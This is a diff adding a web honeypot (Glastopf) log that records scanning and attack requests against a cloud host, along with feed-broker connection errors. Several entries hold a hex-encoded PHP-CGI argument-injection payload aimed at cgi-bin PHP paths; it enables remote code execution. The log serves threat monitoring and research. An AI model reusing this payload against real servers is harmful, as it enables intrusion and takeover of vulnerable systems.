@@ -1,0 +1,35 @@
+2014-11-17 02:20:34,516 (glastopf.glastopf) 61.224.229.200 requested POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 02:20:34,603 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-17 02:20:34,603 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-17 02:20:34,603 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-17 02:20:35,019 (pyhpfeeds) info message name: hpfriends, rand: 'd\x03\x80\xcd'
+2014-11-17 02:39:48,680 (glastopf.glastopf) 61.147.107.107 requested POST /index.action on ip-10-239-45-35.ec2.internal:80
+2014-11-17 05:20:05,710 (glastopf.glastopf) 100.42.30.34 requested GET /cgi-bin/php5 on ip-10-239-45-35.ec2.internal:80
+2014-11-17 05:20:05,790 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-17 05:20:05,790 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-17 05:20:05,790 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-17 05:20:05,894 (glastopf.glastopf) 100.42.30.34 requested GET /cgi-bin/php-cgi on ip-10-239-45-35.ec2.internal:80
+2014-11-17 05:20:05,971 (glastopf.glastopf) 100.42.30.34 requested GET /cgi-bin/php.cgi on ip-10-239-45-35.ec2.internal:80
+2014-11-17 05:20:06,049 (glastopf.glastopf) 100.42.30.34 requested GET /cgi-bin/php4 on ip-10-239-45-35.ec2.internal:80
+2014-11-17 05:20:06,284 (pyhpfeeds) info message name: hpfriends, rand: '\xd8\xba\xba\xfe'
+2014-11-17 05:21:45,843 (glastopf.glastopf) 72.9.231.226 requested GET /cgi-bin/bts.cgi on ip-10-239-45-35.ec2.internal:80
+2014-11-17 10:22:52,583 (glastopf.glastopf) 91.234.26.6 requested POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 10:22:52,657 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-17 10:22:52,657 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-17 10:22:52,657 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-17 10:22:52,923 (glastopf.glastopf) 91.234.26.6 requested POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 10:22:53,146 (pyhpfeeds) info message name: hpfriends, rand: '\x07\xb4\xa9\xc2'
+2014-11-17 10:22:53,243 (glastopf.glastopf) 91.234.26.6 requested POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 10:22:53,563 (glastopf.glastopf) 91.234.26.6 requested POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 10:22:53,883 (glastopf.glastopf) 91.234.26.6 requested POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E on ip-10-239-45-35.ec2.internal:80
+2014-11-17 12:53:11,717 (glastopf.glastopf) 162.242.146.223 requested HEAD / on ip-10-239-45-35.ec2.internal:80
+2014-11-17 12:53:11,787 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-17 12:53:11,788 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-17 12:53:11,788 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-17 12:53:12,212 (pyhpfeeds) info message name: hpfriends, rand: '>\xe1\x93\xc8'
+2014-11-17 15:16:03,484 (glastopf.glastopf) 42.115.170.202 requested GET /manager/html on ip-10-239-45-35.ec2.internal:80
+2014-11-17 15:16:03,614 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-17 15:16:03,614 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-17 15:16:03,614 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-17 15:16:04,102 (pyhpfeeds) info message name: hpfriends, rand: 'O\x94\x19\xf1'
+2014-11-17 16:41:19,014 (glastopf.glastopf) 193.174.89.19 requested GET / on ip-10-239-45-35.ec2.internal:80
